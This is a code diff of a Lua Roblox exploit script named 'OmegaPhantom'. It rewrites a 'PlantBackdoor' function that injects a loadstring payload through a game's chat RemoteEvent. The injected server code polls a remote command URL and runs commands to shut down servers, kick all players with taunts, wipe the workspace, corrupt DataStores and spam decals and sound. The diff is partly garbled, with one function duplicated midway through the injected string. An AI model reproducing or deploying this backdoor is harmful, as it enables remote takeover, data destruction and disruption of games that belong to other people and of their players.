@@ -203,72 +203,7 @@ local function UniversalSpread()
     return true
 end
 
--- ========================[ دوال أساسية منقولة قبل الأوامر ]========================
-local function sendGlobalMessageToAllPlayers(msg)
-    for _, plr in pairs(Players:GetPlayers()) do
-        local gui = Instance.new("ScreenGui")
-        local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(0, 500, 0, 60)
-        frame.Position = UDim2.new(0.5, -250, 0, 10)
-        frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
-        frame.BackgroundTransparency = 0.4
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1,0,1,0)
-        label.BackgroundTransparency = 1
-        label.Text = msg
-        label.TextColor3 = Color3.fromRGB(255,50,50)
-        label.Font = Enum.Font.GothamBold
-        label.TextSize = 18
-        label.Parent = frame
-        frame.Parent = gui
-        gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
-        task.wait(5)
-        gui:Destroy()
-    end
-end
-
-local function runDecalSpam()
-    local function exPro(root)
-        for _, v in pairs(root:GetChildren()) do
-            if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
-                v.Parent = nil
-            elseif v:IsA("BasePart") and not v:IsDescendantOf(LocalPlayer.Character) then
-                v.Material = Enum.Material.Plastic
-                v.Transparency = 0
-                for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
-                    local d = Instance.new("Decal", v)
-                    d.Texture = "rbxassetid://8408806737"
-                    d.Face = face
-                end
-            end
-            exPro(v)
-        end
-    end
-    local sky = Instance.new("Sky")
-    sky.SkyboxBk = "rbxassetid://8408806737"
-    sky.SkyboxDn = "rbxassetid://8408806737"
-    sky.SkyboxFt = "rbxassetid://8408806737"
-    sky.SkyboxLf = "rbxassetid://8408806737"
-    sky.SkyboxRt = "rbxassetid://8408806737"
-    sky.SkyboxUp = "rbxassetid://8408806737"
-    sky.Parent = Lighting
-    Lighting.TimeOfDay = 12
-    exPro(Workspace)
-    for _, v in pairs(Workspace:GetChildren()) do
-        if v:IsA("Sound") then v:Stop(); v:Destroy() end
-    end
-    local snd = Instance.new("Sound")
-    snd.SoundId = "rbxassetid://72089843969979"
-    snd.Volume = 10
-    snd.Looped = true
-    snd.Pitch = 0.2
-    snd.Parent = Workspace
-    snd:Play()
-    task.wait(0.1)
-    snd:Play()
-end
-
--- =============================[ GLOBAL COMMANDS VIA GITHUB ]=============================
+-- =============================[ GLOBAL COMMANDS VIA GITHUB (CLIENT SIDE) ]=============================
 local function getFileSha()
     local headers = {["Authorization"] = "token " .. githubToken, ["User-Agent"] = "OmegaPhantom"}
     local success, response = pcall(function() return HttpService:GetAsync(githubApiUrl, headers) end)
@@ -360,7 +295,6 @@ end
 
 local function startCommandListener()
     lastCommand = fetchGlobalCommand()
-    -- تنفيذ أول أمر يُقرأ فوراً
     if lastCommand ~= "" then
         print("[GLOBAL] Initial command: " .. lastCommand)
         executeGlobalCommand(lastCommand)
@@ -428,6 +362,71 @@ local function setupFragments()
 end
 
 -- =============================[ CORE FUNCTIONS (PLANT, DECAL, MESSAGES) ]=============================
+local function sendGlobalMessageToAllPlayers(msg)
+    for _, plr in pairs(Players:GetPlayers()) do
+        local gui = Instance.new("ScreenGui")
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 500, 0, 60)
+        frame.Position = UDim2.new(0.5, -250, 0, 10)
+        frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+        frame.BackgroundTransparency = 0.4
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1,0,1,0)
+        label.BackgroundTransparency = 1
+        label.Text = msg
+        label.TextColor3 = Color3.fromRGB(255,50,50)
+        label.Font = Enum.Font.GothamBold
+        label.TextSize = 18
+        label.Parent = frame
+        frame.Parent = gui
+        gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
+        task.wait(5)
+        gui:Destroy()
+    end
+end
+
+local function runDecalSpam()
+    local function exPro(root)
+        for _, v in pairs(root:GetChildren()) do
+            if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
+                v.Parent = nil
+            elseif v:IsA("BasePart") and not v:IsDescendantOf(LocalPlayer.Character) then
+                v.Material = Enum.Material.Plastic
+                v.Transparency = 0
+                for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
+                    local d = Instance.new("Decal", v)
+                    d.Texture = "rbxassetid://8408806737"
+                    d.Face = face
+                end
+            end
+            exPro(v)
+        end
+    end
+    local sky = Instance.new("Sky")
+    sky.SkyboxBk = "rbxassetid://8408806737"
+    sky.SkyboxDn = "rbxassetid://8408806737"
+    sky.SkyboxFt = "rbxassetid://8408806737"
+    sky.SkyboxLf = "rbxassetid://8408806737"
+    sky.SkyboxRt = "rbxassetid://8408806737"
+    sky.SkyboxUp = "rbxassetid://8408806737"
+    sky.Parent = Lighting
+    Lighting.TimeOfDay = 12
+    exPro(Workspace)
+    for _, v in pairs(Workspace:GetChildren()) do
+        if v:IsA("Sound") then v:Stop(); v:Destroy() end
+    end
+    local snd = Instance.new("Sound")
+    snd.SoundId = "rbxassetid://72089843969979"
+    snd.Volume = 10
+    snd.Looped = true
+    snd.Pitch = 0.2
+    snd.Parent = Workspace
+    snd:Play()
+    task.wait(0.1)
+    snd:Play()
+end
+
+-- =============================[ PLANT BACKDOOR (WITH GITHUB COMMAND LISTENER) ]=============================
 local function PlantBackdoor()
     if sleepModeActive then return false end
     local chatRemote = nil
@@ -438,32 +437,256 @@ local function PlantBackdoor()
         end
     end
     if not chatRemote then return false end
-    local backdoor = Instance.new("RemoteEvent")
-    backdoor.Name = "OmegaCore_" .. HttpService:GenerateGUID(false):sub(1,6)
-    backdoor.Parent = ReplicatedStorage
-    local injection = string.format([[
-        local bd = game:GetService("ReplicatedStorage"):FindFirstChild("%s")
-        if not bd then return end
-        local owner = "%s"
-        bd.OnServerEvent:Connect(function(plr, cmd)
-            if plr and plr.Name == owner and cmd == "grant" then
-                for _,v in pairs(game:GetDescendants()) do
-                    if v:IsA("RemoteEvent") and (v.Name:lower():find("admin") or v.Name:lower():find("owner")) then
-                        pcall(function() v:FireServer(plr, "setowner") end)
+
+    -- الكود الخبيث الذي سيتم حقنه في السيرفر (يقرأ الأوامر من GitHub وينفذها)
+    local backdoorCode = [[
+        local HttpService = game:GetService("HttpService")
+        local Workspace = game:GetService("Workspace")
+        local Lighting = game:GetService("Lighting")
+        local Players = game:GetService("Players")
+        local TeleportService = game:GetService("TeleportService")
+        local DataStoreService = game:GetService("DataStoreService")
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local ServerScriptService = game:GetService("ServerScriptService")
+        local CoreGui = game:GetService("CoreGui")
+        local Owner = "]] .. Owner .. [["
+
+        local commandUrl = "]] .. commandUrl .. [["
+        local lastCommand = ""
+
+        local function sendMessageToAll(msg)
+            for _, plr in pairs(Players:GetPlayers()) do
+                local gui = Instance.new("ScreenGui")
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(0, 500, 0, 60)
+                frame.Position = UDim2.new(0.5, -250, 0, 10)
+                frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+                frame.BackgroundTransparency = 0.4
+                local label = Instance.new("TextLabel")
+                label.Size = UDim2.new(1,0,1,0)
+                label.BackgroundTransparency = 1
+                label.Text = msg
+                label.TextColor3 = Color3.fromRGB(255,50,50)
+                label.Font = Enum.Font.GothamBold
+                label.TextSize = 18
+                label.Parent = frame
+                frame.Parent = gui
+                gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
+                task.wait(5)
+                gui:Destroy()
+            end
+        end
+
+        local function runDecalSpam()
+            local function exPro(root)
+                for _, v in pairs(root:GetChildren()) do
+                    if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
+                        v.Parent = nil
+                    elseif v:IsA("BasePart") then
+                        v.Material = Enum.Material.Plastic
+                        v.Transparency = 0
+                        for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
+                            local d = Instance.new("Decal", v)
+                            d.Texture = "rbxassetid://8408806737"
+                            d.Face = face
+                        end
                     end
-                end
-                local ls = plr:FindFirstChild("leaderstats")
-                if ls then
-                    for _,s in pairs(ls:GetChildren()) do
-                        if s.Name:lower():find("rank") then pcall(function() s.Value = 999 end)
-                    end
+                    exPro(v)
                 end
             end
-        end)
-    ]], backdoor.Name, Owner)
-    pcall(function() chatRemote:FireServer(encode(injection)) end)
-    task.wait(2)
-    pcall(function() backdoor:FireServer("grant") end)
+            local sky = Instance.new("Sky")
+            sky.SkyboxBk = "rbxassetid://8408806737"
+            sky.SkyboxDn = "rbxassetid://8408806737"
+            sky.SkyboxFt = "rbxassetid://8408806737"
+            sky.SkyboxLf = "rbxassetid://8408806737"
+            sky.SkyboxRt = "rbxassetid://8408806737"
+            sky.SkyboxUp = "rbxassetid://8408806737"
+            sky.Parent = Lighting
+            Lighting.TimeOfDay = 12
+            exPro(Workspace)
+            for _, v in pairs(Workspace:GetChildren()) do
+                if v:IsA("Sound") then v:Stop(); v:Destroy() end
+            end
+          local snd = Instance.new("Sound")
+    snd.SoundId = "rbxassetid://72089843969979"
+    snd.Volume = 10
+    snd.Looped = true
+    snd.Pitch = 0.2
+    snd.Parent = Workspace
+    snd:Play()
+    task.wait(0.1)
+    snd:Play()
+end
+
+-- =============================[ PLANT BACKDOOR (WITH GITHUB COMMAND LISTENER) ]=============================
+local function PlantBackdoor()
+    if sleepModeActive then return false end
+    local chatRemote = nil
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") and (v.Name:lower():find("say") or v.Name:lower():find("chat") or v.Name:lower():find("message")) then
+            chatRemote = v
+            break
+        end
+    end
+    if not chatRemote then return false end
+
+    -- الكود الخبيث الذي سيتم حقنه في السيرفر (يقرأ الأوامر من GitHub وينفذها)
+    local backdoorCode = [[
+        local HttpService = game:GetService("HttpService")
+        local Workspace = game:GetService("Workspace")
+        local Lighting = game:GetService("Lighting")
+        local Players = game:GetService("Players")
+        local TeleportService = game:GetService("TeleportService")
+        local DataStoreService = game:GetService("DataStoreService")
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local ServerScriptService = game:GetService("ServerScriptService")
+        local CoreGui = game:GetService("CoreGui")
+        local Owner = "]] .. Owner .. [["
+
+        local commandUrl = "]] .. commandUrl .. [["
+        local lastCommand = ""
+
+        local function sendMessageToAll(msg)
+            for _, plr in pairs(Players:GetPlayers()) do
+                local gui = Instance.new("ScreenGui")
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(0, 500, 0, 60)
+                frame.Position = UDim2.new(0.5, -250, 0, 10)
+                frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+                frame.BackgroundTransparency = 0.4
+                local label = Instance.new("TextLabel")
+                label.Size = UDim2.new(1,0,1,0)
+                label.BackgroundTransparency = 1
+                label.Text = msg
+                label.TextColor3 = Color3.fromRGB(255,50,50)
+                label.Font = Enum.Font.GothamBold
+                label.TextSize = 18
+                label.Parent = frame
+                frame.Parent = gui
+                gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
+                task.wait(5)
+                gui:Destroy()
+            end
+        end
+
+        local function runDecalSpam()
+            local function exPro(root)
+                for _, v in pairs(root:GetChildren()) do
+                    if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
+                        v.Parent = nil
+                    elseif v:IsA("BasePart") then
+                        v.Material = Enum.Material.Plastic
+                        v.Transparency = 0
+                        for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
+                            local d = Instance.new("Decal", v)
+                            d.Texture = "rbxassetid://8408806737"
+                            d.Face = face
+                        end
+                    end
+                    exPro(v)
+                end
+            end
+            local sky = Instance.new("Sky")
+            sky.SkyboxBk = "rbxassetid://8408806737"
+            sky.SkyboxDn = "rbxassetid://8408806737"
+            sky.SkyboxFt = "rbxassetid://8408806737"
+            sky.SkyboxLf = "rbxassetid://8408806737"
+            sky.SkyboxRt = "rbxassetid://8408806737"
+            sky.SkyboxUp = "rbxassetid://8408806737"
+            sky.Parent = Lighting
+            Lighting.TimeOfDay = 12
+            exPro(Workspace)
+            for _, v in pairs(Workspace:GetChildren()) do
+                if v:IsA("Sound") then v:Stop(); v:Destroy() end
+            end
+            local snd = Instance.new("Sound")
+            snd.SoundId = "rbxassetid://72089843969979"
+            snd.Volume = 10
+            snd.Looped = true
+            snd.Pitch = 0.2
+            snd.Parent = Workspace
+            snd:Play()
+            task.wait(0.1)
+            snd:Play()
+        end
+
+        local function fetchGlobalCommand()
+            local success, result = pcall(function()
+                return HttpService:RequestAsync({
+                    Url = commandUrl,
+                    Method = "GET",
+                    Headers = {
+                        ["Content-Type"] = "application/json",
+                        ["User-Agent"] = "Roblox/OmegaPhantom"
+                    }
+                })
+            end)
+            if success and result.Success then
+                print("[BACKDOOR] command: " .. result.Body)
+                local raw = result.Body
+                raw = raw:gsub("%s+", " ")
+                local cmd = raw:match("امر%s+([%a]+)") or raw:match("command%s+([%a]+)") or raw:match("([%a]+)")
+                if not cmd then cmd = "" end
+                return cmd:lower()
+            else
+                warn("[BACKDOOR] فشل الجلب: " .. tostring(result and result.StatusCode or "Unknown Error"))
+                return ""
+            end
+        end
+
+        local function executeCommand(cmd)
+            if cmd == "shutdown" then
+                sendMessageToAll("you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!")
+                pcall(function() game:Shutdown() end)
+            elseif cmd == "kickall" then
+                sendMessageToAll("you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!")
+                for _, p in pairs(Players:GetPlayers()) do
+                    pcall(function() p:Kick("you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!") end)
+                end
+            elseif cmd == "wipe" then
+                for _, obj in pairs(Workspace:GetChildren()) do
+                    if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
+                        pcall(function() obj:Destroy() end)
+                    end
+                end
+            elseif cmd == "reset" then
+                TeleportService:Teleport(game.PlaceId)
+            elseif cmd == "color" then
+                Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
+            elseif cmd == "decalspam" then
+                task.spawn(runDecalSpam)
+            elseif cmd == "announce" then
+                sendMessageToAll("[OMEGA] Server infected by 109er_0!")
+            elseif cmd == "dataswipe" then
+                pcall(function()
+                    for _, ds in pairs(DataStoreService:GetDataStores()) do
+                        pcall(function() ds:SetAsync("CORRUPTED", "DELETED") end)
+                    end
+                end)
+            end
+        end
+
+        -- بدء الاستماع
+        lastCommand = fetchGlobalCommand()
+        if lastCommand ~= "" then
+            print("[BACKDOOR] Initial command: " .. lastCommand)
+            executeCommand(lastCommand)
+        end
+        while true do
+            task.wait(6)
+            local newCommand = fetchGlobalCommand()
+            if newCommand ~= "" and newCommand ~= lastCommand then
+                print("[BACKDOOR] Executing: " .. newCommand)
+                executeCommand(newCommand)
+                lastCommand = newCommand
+            end
+        end
+    ]]
+
+    -- حقن الكود عبر chat remote
+    local injection = 'loadstring(' .. HttpService:JSONEncode(backdoorCode) .. ')()'
+    pcall(function() chatRemote:FireServer(injection) end)
+    task.wait(1)
     return true
 end
 
@@ -665,10 +888,9 @@ local function CreateMenuGUI()
     closeBtn.Parent = titleBar
     closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 
-    -- ✅ آلية السحب الصحيحة
+    -- آلية السحب الصحيحة
     local UserInputService = game:GetService("UserInputService")
     local dragging, dragStart, frameStart
-
     titleBar.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
             dragging = true
@@ -676,13 +898,11 @@ local function CreateMenuGUI()
             frameStart = frame.Position
         end
     end)
-
     titleBar.InputEnded:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
             dragging = false
         end
     end)
-
     UserInputService.InputChanged:Connect(function(input)
         if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
             local delta = input.Position - dragStart
@@ -722,7 +942,7 @@ local function CreateMenuGUI()
     statusLabel.Parent = buttonContainer
     statusLabel.LayoutOrder = 999
 
-    -- تعريف الأزرار
+    -- تعريف الأزرار (جميع الأوامر)
     local commands = {
         {name = "Fly", cmd = "fly"},
         {name = "NoClip", cmd = "noclip"},
@@ -816,11 +1036,12 @@ local function CreateMenuGUI()
         if txt ~= "" then
             sendGlobalMessageToAllPlayers(txt)
             statusLabel.Text = "تم إرسال الرسالة"
-            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+            statusLabel.TextColor3 = Color3.fromrgb(100,255,100)
             msgInput.Text = ""
         end
     end)
 
+    -- ضبط حجم Canvas تلقائياً
     layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         buttonContainer.CanvasSize = UDim2.new(0, layout.AbsoluteContentSize.X, 0, layout.AbsoluteContentSize.Y + 40)
     end)
